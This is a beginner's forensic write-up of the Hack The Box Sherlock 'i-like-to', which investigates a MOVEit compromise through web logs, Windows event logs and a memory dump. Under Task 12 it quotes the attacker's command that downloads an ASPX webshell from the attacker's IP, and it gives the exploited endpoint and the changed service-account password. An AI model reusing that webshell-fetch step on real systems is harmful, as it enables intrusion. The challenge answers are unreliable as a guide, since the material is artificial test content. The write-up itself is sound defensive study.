# Sherlock: i-like-to
## Introduction
This is a write-up for the Hack The Box Sherlock "i-like-to". Let's get Started!

## Difficulty: Easy
![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/5f8b2972-af29-41c9-b243-2c508df79bc8)

## Description
"We have unfortunately been hiding under a rock and did not see the many news articles referencing the recent MOVEit CVE being exploited in the wild. We believe our Windows server may be vulnerable and has recently fallen victim to this compromise. We need to understand this exploit in a bit more detail and confirm the actions of the attacker & retrieve some details so we can implement them into our SOC environment. We have provided a triage of all the necessary artifacts from our compromised Windows server. PS: One of the artifacts is a memory dump, but we forgot to include the vmss file. You might have to go back to basics here..."

## Tools Used
EZ Tools, Libre Office, MySQL Workbench, MySQL Server

## Resources
Link to CVE: https://www.cve.org/CVERecord?id=CVE-2023-35708

## Skill(s)
Analysis, Forensics

## Points


## Walkthrough
First, I am going to google the CVE mentioned in the description to learn more about it.

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/40b2ce0a-0441-4a7e-9636-cdb8bec5429a)

Interesting! An SQL injection attack. 

![batman_interesting](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/ded58e22-b4cc-45cb-b97a-de25894c9ea6)

Unzip the files.

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/a7935df6-ae1e-4bb2-9555-476b33c9a300)

So we have another folder called triage and a .vmem file. I haven't seen that file extension before so I am going to look it up really quick.

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/73a159c0-4812-4f4b-94bb-f5eba5ee67be)

Ah okay...

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/18427e1e-be5d-4a5e-af3a-0f7da677b1a6)

Some JSON files and 2 more folders. 

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/eaf994ae-da11-4be6-9c21-e5a8cd44be62)

Inside the results folder are some KAPE files. I don't know what those are so I'm going to look it up.

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/880974f8-9a1e-4092-b09c-0db9f77190cf)

Ah okay... so it's for an open source tool called KapeFiles. I will probably use that later.

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/9b93fdd6-f39f-4e1a-8a26-8a90507d3b89)

Inside the uploads folder, there are 2 more folders and the moveit.sql file. 

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/e647b2c7-2344-4ff4-9eb4-c5c124c7c135)

Inside the auto folder, there are log files from Windows. I'm not familiar with WMI or RtBackup so I will have to search Uncle Google again to learn more.

![google_it](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/2b8e2931-dcd1-4c3e-acdd-1f73287d4802)

### What is Windows WMI?

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/67263f61-8885-44a4-8d76-e1256d97af2e)

Link: https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page

### What is Rtbackup?

I found this explanation from Stack Exchange about the specific file path I have in the auto folder.

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/d16fadb6-d176-44e1-a191-e2254688e2cc)

Link: https://serverfault.com/questions/237637/what-is-stored-in-windir-system32-logfiles-wmi-rtbackup

There are more files to look through but I will look at the rest on my own.

![theres_more](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/07999bdd-f01e-41e4-a69d-04b223da9a2c)

This is the first retired Sherlock and it seems to be kinda complicated for someone new to forensics. I will follow this YT video by IPPSec: https://youtu.be/iqu5SkdK8_w?si=YLsiXrP9DlOYp5VR and the offical write up.

### Setup
In the official walkthrough (OW), the writer uses EZ's evtxecmd & mftecmd tools. I watched this introduction video to the tool to learn more about it.

YT link to EZ mftecmd: https://youtu.be/_qElVZJqlGY?si=rYJlE2iX-QyjMZJV
Link to EZ tools: https://www.sans.org/tools/ez-tools/

#### EZ tools

Convert MFT file to .csv using MFTECmd

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/056bd6b7-ebad-44d7-aa5e-0f8685cad4fb)

Convert Logs to .csv using Evtxecmd

 ```
 EvtxEcmd.exe -d \iliketo.zip\Triage\uploads\auto\C%3A\Windows\System32\winevt\Logs --csv [location of output file] --csvf eventsOutput.csv
```
#### MySQL Server and Workbench

I followed this YouTube video: https://youtu.be/u96rVINbAUI?si=t1cNbG8Pj5KcZKsi


## Analysis

The OW begins with the IIS Web logs but doesn't tell you the file name.

Path to file: iliketo.zip\Triage\uploads\auto\C%3A\inetpub\logs\LogFiles\W3SVC2\u_ex230712.log

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/95c53a43-31db-4161-86f5-91c6020b73e8)

Here is the first indication of an NMAP Scan beginning at 10:11.

### Steps to Successful Exploitation of MoveIT
The OW mentions the steps to successful exploitation, but I found the "Indicators of Compromise" section of the Horizon link more helpful for understanding what I am looking for.

1.) "Monitor the "/moveitisapi/moveitisapi.dll?action=m2" endpoint for any unusual access
patterns or frequent hits. This could indicate potential exploitation attempts."

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/6348819a-9ee1-47e0-9035-c33c3183cf9c)

Horizon Ai Link: https://www.horizon3.ai/moveit-transfer-cve-2023-34362-deep-dive-and-indicators-of-compromise/

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/2fc7fe88-6b5f-4452-b99c-2cbc68a9003d)

I found all the indicators mentioned.

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/8fcb94aa-85ae-4b08-85d2-54ed043c0309)


## Task 1: Name of the ASPX webshell uploaded by the attacker?

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/c0aa4e51-1b80-4c6f-b6a3-ae441f5bc26d)

### Answer: move.aspx

## Task 2: What was the attacker's IP address?

### Answer: 10.255.254.3

## Task 3: What user agent was used to perform the initial attack?

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/04876b35-e606-4d1e-b811-195d6a7c8850)

### Answer: Ruby

## Task 4: When was the ASPX webshell uploaded by the attacker?

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/9127bbd9-3cbf-42ff-8461-1412ee595be4)

### Answer: 12/07/2023 11:24:30

## Task 5: The attacker uploaded an ASP web shell which didn't work, what is its file size in bytes?

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/bf12672b-f0fb-4042-9122-d7d43c991ea8)

### Answer: 1362

## Task 6: Which tool did the attacker use to initially enumerate the vulnerable server?

### Answer: nmap

## Task 7: We suspect the attacker may have changed the password for our service account. Please confirm the time this occurred (UTC)

According to the walkthrough Windows security event 4724 is triggered when a password is changed. To see if the attacker changed the password I used the following command:
```
strings I-like-to-27a787c5.vmem | grep moveitsvc
```
Info on Windows Security Event 4724: https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4724

At the end of the command, you can see the attacker used the net command to possibly change the password.

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/195c67ac-bcb0-4836-bb5a-e9d88b955363)

The walkthrough didn't go into more detail about what the net command does, so I looked it up.

## Net Command Research

So for the use case here I think the attacker did change the password assuming there was a password in the first place. The attacker only used the following two parameters:

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/6fd2684a-3130-4fb6-b1db-6917ac9b6a8e)

So they may have set a password, changed an existing password, or added a new user all together and set the password for the new user.

I also found it interesting that this command applies to mostly legacy systems.

Net Command info: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771865(v=ws.11)

I sorted the output by event ID and found 8 password reset attempts.

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/1f66ca96-ad19-4274-8679-6fc3f5a57151)

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/840cd62e-6ded-4192-a43c-2d7aff7beb9a)

### Answer: 12/07/2023 11:09:27

## Task 8: Which protocol did the attacker utilize to remote into the compromised machine?

### Answer: RDP

## Task 9: Please confirm the date and time the attacker remotely accessed the compromised machine.

To find this I just googled the Event ID for remote desktop connection (Event 1149).

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/90c5961e-ecae-46c2-86ac-52c4969cd994)

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/f2cafeea-18e0-4c44-9c15-cf481f687b55)

I thought this was the answer, but I guess not.

![sike](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/fa0f59ef-4143-4413-b13f-ecf52c6b2ae9)

Let's go back to the guide.

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/f7e3abf3-e2c3-4cfc-a7c1-6146a7587ca2)

Security Event 4624 was used instead. 

### Answser: 12/07/2023 11:11:18

## Task 10: What was the user agent that the attacker used to access the web shell?

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/92cbab55-1928-4d4a-a2f5-697adffbf1fd)

This is found in the log file from Task 1.

### Answer: Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0

## Task 11: What is the inst ID of the attacker?

To get this output from mySQL I had to update the syntax.

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/a15cb206-403c-4b3a-86c6-3eab6932e25f)

### Answer: 1234

## Task 12: What command was run by the attacker to retrieve the webshell?

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/cacf70c4-b129-4241-aa5d-da6558dcb983)


### Answer: wget http:/ /10.255.254.3:9001/move.aspx -OutFile move.aspx

## Task 13: What was the string within the title header of the web shell deployed by the TA?
This is found with the strings command used earlier.

```
strings I-like-to-27a787c5.vmem | grep asp
```
![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/94fb34b3-2cdc-447b-8177-3702e8396b31)

### Answer: asp.net webshell

## Task 14: What did the TA change the moveitsvc account password to?

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/195c67ac-bcb0-4836-bb5a-e9d88b955363)

### Answer: 5trongP4ssw0rd

## Review

![image](https://github.com/zrmartin71/HTB_Write_Ups/assets/54414820/4c70fe15-53aa-4f8f-92ca-6e3cfad69ce4)

I learned a lot from this. I am new to DFIR, so I wanted to try the retired Sherlock to learn how to do forensic analysis. Following the official write-up was easy. The only hiccup I had was using the same tools the writer used. You will have to update the syntax for the MySQL part of the write-up. I also personally chose not to write a script for the EZ tools section. Overall it was a great experience! 10/10 would do it again!
